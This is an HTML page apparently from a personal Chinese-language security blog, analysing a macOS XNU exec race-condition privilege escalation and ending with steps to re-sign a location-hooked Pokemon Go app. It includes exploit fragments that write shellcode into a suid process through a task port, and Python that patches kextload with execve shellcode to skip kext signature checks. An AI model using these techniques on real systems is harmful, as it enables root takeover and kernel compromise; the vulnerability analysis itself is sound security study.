@@ -1,0 +1,403 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+###漏洞分析：
+一个root权限代码执行漏洞.  
+详细分析可以见Google Project Zero的[blog](http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html).  
+对照xnu的源码也可以印证其中的步骤`kern_exec.c`：  
+	
+	......
+	//Actually load the image file we previously decided to load.
+	
+	lret = load_machfile(imgp, mach_header, thread, map, &load_result);
+	
+	if (lret != LOAD_SUCCESS) {
+		error = load_return_to_errno(lret);
+		goto badtoolate;
+	}
+
+	proc_lock(p);
+	p->p_cputype = imgp->ip_origcputype;
+	p->p_cpusubtype = imgp->ip_origcpusubtype;
+	proc_unlock(p);
+
+	vm_map_set_user_wire_limit(get_task_map(task), p->p_rlimit[RLIMIT_MEMLOCK].rlim_cur);
+
+	/* 
+	 * Set code-signing flags if this binary is signed, or if parent has
+	 * requested them on exec.
+	 */
+	if (load_result.csflags & CS_VALID) {
+		imgp->ip_csflags |= load_result.csflags & 
+			(CS_VALID|
+			 CS_HARD|CS_KILL|CS_ENFORCEMENT|CS_REQUIRE_LV|CS_DYLD_PLATFORM|
+			 CS_EXEC_SET_HARD|CS_EXEC_SET_KILL|CS_EXEC_SET_ENFORCEMENT);
+	} else {
+		imgp->ip_csflags &= ~CS_VALID;
+	}
+
+	if (p->p_csflags & CS_EXEC_SET_HARD)
+		imgp->ip_csflags |= CS_HARD;
+	if (p->p_csflags & CS_EXEC_SET_KILL)
+		imgp->ip_csflags |= CS_KILL;
+	if (p->p_csflags & CS_EXEC_SET_ENFORCEMENT)
+		imgp->ip_csflags |= CS_ENFORCEMENT;
+	if (p->p_csflags & CS_EXEC_SET_INSTALLER)
+		imgp->ip_csflags |= CS_INSTALLER;
+
+
+	/*
+	 * Set up the system reserved areas in the new address space.
+	 */
+	vm_map_exec(get_task_map(task),
+		    task,
+		    (void *) p->p_fd->fd_rdir,
+		    cpu_type());
+	
+	/*
+	 * Close file descriptors which specify close-on-exec.
+	 */
+	fdexec(p, psa != NULL ? psa->psa_flags : 0);
+
+	/*
+	 * deal with set[ug]id.
+	 */
+	error = exec_handle_sugid(imgp);
+	if (error) {
+		goto badtoolate;
+	}	
+	......
+	
+这里主要注意从`load_machfile`到`exec_handle_sugid`：  
+`load_machfile`会处理mach文件的签名校验、然后申请新的内存空间存放新的程序代码，最后执行`swap_task_map`，更新当前任务的`vm_map`指针。  
+exec_handle_sugid则是专门为suid程序做的一个检查，如果发现时suid程序，那么重置当前任务的端口权限；  
+
+所以竞争条件出现的窗口在于，执行`swap_task_map`之后，执行`exec_handle_sugid`之前，具有写权限的端口可以往新的vm_map中写入任意的数据，达到改变新的程序的目的；  
+如果新的程序本身是一个suid程序，那么我们写入的数据也会以root权限来执行。  
+
+###核心利用代码：  
+
+	for (;;) {
+    // wait until we see that the map has been swapped and the binary is loaded into it:
+    region_count = VM_REGION_BASIC_INFO_COUNT_64;
+    object_name = MACH_PORT_NULL; /* unused */
+    target_first_size = 0x1000;
+    target_first_addr = 0x0;
+
+    err = mach_vm_region(target_task_port,
+                         &target_first_addr,
+                         &target_first_size,
+                         VM_REGION_BASIC_INFO_64,
+                         (vm_region_info_t)&region,
+                         &region_count,
+                         &object_name);
+
+    if (target_first_addr != original_first_addr && target_first_addr < 0x200000000) {
+      // the first address has changed implying that the map was swapped
+      // let's try to win the race
+      break;
+    }  
+    }  
+  	mach_vm_address_t target_addr = target_first_addr + 0x1000;
+  	mach_msg_type_number_t target_size = 0x1000;
+  	mach_vm_protect(target_task_port, target_addr, target_size, 0, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
+  	mach_vm_write(target_task_port, target_addr, addr, target_size);
+  	
+子进程把具有读写权限的port交给父进程后，子进程执行execve一个具有suid权限的binary；  
+父进程不断的读取子进程的`vm_region`，一旦发现返回值发生改变，说明子进程发生了`swap_task_map`，这时候竞争窗口便出现了，可以利用port的写权限写入shellcode。  
+
+###KextLoad Patch： 
+google的文章中提到，可以进一步对kextload执行patch，去除其中对于加载kext时候的签名校验(这样攻击就可以进入内核层)。  
+我看了下`/sbin/kextload` 这个程序本身就是root下，具有写权限的；而这种用户层的程序在Mac下是无需签名校验的；所以问题仅仅是如何Patch这个kextload  
+
+<pre><code>def find_entrypoint(path):
+  '''
+  just use otool to pull the entrypoint out the LC_MAIN load command...
+  for older versions of OS X you need to use the unixthread
+  '''
+  s = subprocess.check_output('otool -l ' + path + ' | egrep LC_MAIN -A 2 | egrep entryoff | egrep --only-matching "[0-9]+"', shell=True)
+  return int(s)  
+def patch_in_shellcode(original_bytes, entrypoint, target_to_exec):
+  c = ("\xeb\x1f"             # jmp get_path
+   # got_path:
+       "\x5f"                 # pop rdi
+       "\x48\x31\xdb"         # xor rbx,rbx
+       "\x53"                 # push rbx
+       "\x57"                 # push rdi
+       "\x48\x89\xe6"         # mov rsi,rsp
+       "\x48\x31\xd2"         # xor rdx,rdx
+       "\xb8\x3b\x00\x00\x02" # mov eax,0x200003b   ; BSD syscall family | syscall_exec
+       "\x0f\x05"             # syscall
+       "\xbf\x01\x00\x00\x00" # mov edi, 1
+       "\xb8\x01\x00\x00\x02" # mov eax,0x2000001   ; BSD syscall family | syscall_exit
+       "\x0f\x05"             # syscall
+   # get_path:
+       "\xe8\xdc\xff\xff\xff" # call got_path
+  ) + target_to_exec + '\x00'  
+  patched_bytes = original_bytes[:entrypoint] + c + original_bytes[entrypoint+len(c):]  
+  return patched_bytes</pre></code>  
+  
+这里的`find_entrypoint`这个函数用来寻找注入点，其方法是找到`LC_MAIN`中的`entryoff`的值，我找了个二进制看了下，这个`entryoff`其实就是`main`函数在二进制中的偏移。也就是说，注入点其实就是`main`函数的入口。  
+
+###PokemonGo Resign  
+最近在玩这个游戏，因为国内目前锁区了，所以去下了一个包，hook了它的获取地理位置的函数然后重签名。这个技术虽说知道很久了但是一直没有实践过，主要是利用了一些工具，偷懒在这里简单写一下～  
+1. 下载正版ipa然后砸壳(否则之后重新签名的ipa将不可用)，或者直接下载越狱版本的ipa。  
+2. 二进制在XXX.ipa/Payload/XXX.app/XXX。  
+3. 编写hook代码，可选用captainHook这个框架的模版,编译成dylib。  
+4. yololib， 帮助在二进制中插入LC_LOAD_DYLIB字段。  
+5. codesign -f -s [Cert Name] [Bin Name]签名dylibm(这里的证书需要是distribution类型的)。  
+6. xcrun -sdk iphoneos PackageApplication -v [App Name] -o [ipa Name]把app 打包成ipa。  
+7. sigh resign [ipa］[Cert] [Provising Profile] 重新对整个app进行签名(这里替换成provising profile对应bundle id，provising profile本身应该是ad hoc类型的，否则无法安装到设备上)。  
+8. 安装，发生crash可以利用xcode device工具查看crash日志或者设备日志。
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<h3 id="">漏洞分析：</h3>
+
+<p>一个root权限代码执行漏洞. <br>
+详细分析可以见Google Project Zero的<a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html">blog</a>. <br>
+对照xnu的源码也可以印证其中的步骤<code>kern_exec.c</code>：  </p>
+
+<pre><code>......
+//Actually load the image file we previously decided to load.
+
+lret = load_machfile(imgp, mach_header, thread, map, &amp;load_result);
+
+if (lret != LOAD_SUCCESS) {
+    error = load_return_to_errno(lret);
+    goto badtoolate;
+}
+
+proc_lock(p);
+p-&gt;p_cputype = imgp-&gt;ip_origcputype;
+p-&gt;p_cpusubtype = imgp-&gt;ip_origcpusubtype;
+proc_unlock(p);
+
+vm_map_set_user_wire_limit(get_task_map(task), p-&gt;p_rlimit[RLIMIT_MEMLOCK].rlim_cur);
+
+/* 
+ * Set code-signing flags if this binary is signed, or if parent has
+ * requested them on exec.
+ */
+if (load_result.csflags &amp; CS_VALID) {
+    imgp-&gt;ip_csflags |= load_result.csflags &amp; 
+        (CS_VALID|
+         CS_HARD|CS_KILL|CS_ENFORCEMENT|CS_REQUIRE_LV|CS_DYLD_PLATFORM|
+         CS_EXEC_SET_HARD|CS_EXEC_SET_KILL|CS_EXEC_SET_ENFORCEMENT);
+} else {
+    imgp-&gt;ip_csflags &amp;= ~CS_VALID;
+}
+
+if (p-&gt;p_csflags &amp; CS_EXEC_SET_HARD)
+    imgp-&gt;ip_csflags |= CS_HARD;
+if (p-&gt;p_csflags &amp; CS_EXEC_SET_KILL)
+    imgp-&gt;ip_csflags |= CS_KILL;
+if (p-&gt;p_csflags &amp; CS_EXEC_SET_ENFORCEMENT)
+    imgp-&gt;ip_csflags |= CS_ENFORCEMENT;
+if (p-&gt;p_csflags &amp; CS_EXEC_SET_INSTALLER)
+    imgp-&gt;ip_csflags |= CS_INSTALLER;
+
+
+/*
+ * Set up the system reserved areas in the new address space.
+ */
+vm_map_exec(get_task_map(task),
+        task,
+        (void *) p-&gt;p_fd-&gt;fd_rdir,
+        cpu_type());
+
+/*
+ * Close file descriptors which specify close-on-exec.
+ */
+fdexec(p, psa != NULL ? psa-&gt;psa_flags : 0);
+
+/*
+ * deal with set[ug]id.
+ */
+error = exec_handle_sugid(imgp);
+if (error) {
+    goto badtoolate;
+}   
+......
+</code></pre>
+
+<p>这里主要注意从<code>load_machfile</code>到<code>exec_handle_sugid</code>： <br>
+<code>load_machfile</code>会处理mach文件的签名校验、然后申请新的内存空间存放新的程序代码，最后执行<code>swap_task_map</code>，更新当前任务的<code>vm_map</code>指针。 <br>
+exec<em>handle</em>sugid则是专门为suid程序做的一个检查，如果发现时suid程序，那么重置当前任务的端口权限；  </p>
+
+<p>所以竞争条件出现的窗口在于，执行<code>swap_task_map</code>之后，执行<code>exec_handle_sugid</code>之前，具有写权限的端口可以往新的vm_map中写入任意的数据，达到改变新的程序的目的； <br>
+如果新的程序本身是一个suid程序，那么我们写入的数据也会以root权限来执行。  </p>
+
+<h3 id="">核心利用代码：</h3>
+
+<pre><code>for (;;) {
+// wait until we see that the map has been swapped and the binary is loaded into it:
+region_count = VM_REGION_BASIC_INFO_COUNT_64;
+object_name = MACH_PORT_NULL; /* unused */
+target_first_size = 0x1000;
+target_first_addr = 0x0;
+
+err = mach_vm_region(target_task_port,
+                     &amp;target_first_addr,
+                     &amp;target_first_size,
+                     VM_REGION_BASIC_INFO_64,
+                     (vm_region_info_t)&amp;region,
+                     &amp;region_count,
+                     &amp;object_name);
+
+if (target_first_addr != original_first_addr &amp;&amp; target_first_addr &lt; 0x200000000) {
+  // the first address has changed implying that the map was swapped
+  // let's try to win the race
+  break;
+}  
+}  
+  mach_vm_address_t target_addr = target_first_addr + 0x1000;
+  mach_msg_type_number_t target_size = 0x1000;
+  mach_vm_protect(target_task_port, target_addr, target_size, 0, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
+  mach_vm_write(target_task_port, target_addr, addr, target_size);
+</code></pre>
+
+<p>子进程把具有读写权限的port交给父进程后，子进程执行execve一个具有suid权限的binary； <br>
+父进程不断的读取子进程的<code>vm_region</code>，一旦发现返回值发生改变，说明子进程发生了<code>swap_task_map</code>，这时候竞争窗口便出现了，可以利用port的写权限写入shellcode。  </p>
+
+<h3 id="kextloadpatch">KextLoad Patch：</h3>
+
+<p>google的文章中提到，可以进一步对kextload执行patch，去除其中对于加载kext时候的签名校验(这样攻击就可以进入内核层)。 <br>
+我看了下<code>/sbin/kextload</code> 这个程序本身就是root下，具有写权限的；而这种用户层的程序在Mac下是无需签名校验的；所以问题仅仅是如何Patch这个kextload  </p>
+
+<p></p><pre><code>def find<em>entrypoint(path):
+  '''
+  just use otool to pull the entrypoint out the LC</em>MAIN load command...
+  for older versions of OS X you need to use the unixthread
+  '''
+  s = subprocess.check<em>output('otool -l ' + path + ' | egrep LC</em>MAIN -A 2 | egrep entryoff | egrep --only-matching "[0-9]+"', shell=True)
+  return int(s) <br>
+def patch<em>in</em>shellcode(original<em>bytes, entrypoint, target</em>to<em>exec):
+  c = ("\xeb\x1f"             # jmp get</em>path
+   # got<em>path:
+       "\x5f"                 # pop rdi
+       "\x48\x31\xdb"         # xor rbx,rbx
+       "\x53"                 # push rbx
+       "\x57"                 # push rdi
+       "\x48\x89\xe6"         # mov rsi,rsp
+       "\x48\x31\xd2"         # xor rdx,rdx
+       "\xb8\x3b\x00\x00\x02" # mov eax,0x200003b   ; BSD syscall family | syscall</em>exec
+       "\x0f\x05"             # syscall
+       "\xbf\x01\x00\x00\x00" # mov edi, 1
+       "\xb8\x01\x00\x00\x02" # mov eax,0x2000001   ; BSD syscall family | syscall<em>exit
+       "\x0f\x05"             # syscall
+   # get</em>path:
+       "\xe8\xdc\xff\xff\xff" # call got<em>path
+  ) + target</em>to<em>exec + '\x00' <br>
+  patched</em>bytes = original<em>bytes[:entrypoint] + c + original</em>bytes[entrypoint+len(c):] <br>
+  return patched_bytes</code></pre>  <p></p>
+
+<p>这里的<code>find_entrypoint</code>这个函数用来寻找注入点，其方法是找到<code>LC_MAIN</code>中的<code>entryoff</code>的值，我找了个二进制看了下，这个<code>entryoff</code>其实就是<code>main</code>函数在二进制中的偏移。也就是说，注入点其实就是<code>main</code>函数的入口。  </p>
+
+<h3 id="pokemongoresign">PokemonGo Resign</h3>
+
+<p>最近在玩这个游戏，因为国内目前锁区了，所以去下了一个包，hook了它的获取地理位置的函数然后重签名。这个技术虽说知道很久了但是一直没有实践过，主要是利用了一些工具，偷懒在这里简单写一下～ <br>
+1. 下载正版ipa然后砸壳(否则之后重新签名的ipa将不可用)，或者直接下载越狱版本的ipa。 <br>
+2. 二进制在XXX.ipa/Payload/XXX.app/XXX。 <br>
+3. 编写hook代码，可选用captainHook这个框架的模版,编译成dylib。 <br>
+4. yololib， 帮助在二进制中插入LC<em>LOAD</em>DYLIB字段。 <br>
+5. codesign -f -s [Cert Name] [Bin Name]签名dylibm(这里的证书需要是distribution类型的)。 <br>
+6. xcrun -sdk iphoneos PackageApplication -v [App Name] -o [ipa Name]把app 打包成ipa。 <br>
+7. sigh resign [ipa］[Cert] [Provising Profile] 重新对整个app进行签名(这里替换成provising profile对应bundle id，provising profile本身应该是ad hoc类型的，否则无法安装到设备上)。 <br>
+8. 安装，发生crash可以利用xcode device工具查看crash日志或者设备日志。</p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "20161757.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
